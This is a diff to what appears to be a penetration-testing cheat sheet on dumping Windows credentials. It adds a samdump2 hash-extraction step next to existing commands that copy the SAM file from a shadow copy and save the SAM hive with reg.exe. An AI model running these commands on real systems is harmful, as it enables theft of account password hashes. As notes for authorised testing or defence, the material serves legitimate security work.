@@ -432,10 +432,13 @@ Some methods for dump credentials using native operating system files.
 1. Copy SAM file from shadow: 
 `copy $PathToShadow\Windows\System32\config\SAM C:\temp`
 
+1. Extract hashes from SAM file:
+   `samdump2 system sam`
+ 
 <br>
 
 ##### From Registry
-1. Extracting SAM registry using `reg.exe`
+1. Extracting SAM from registry:
    `reg.exe save hklm\sam c:\temp\sam.save`
 
 
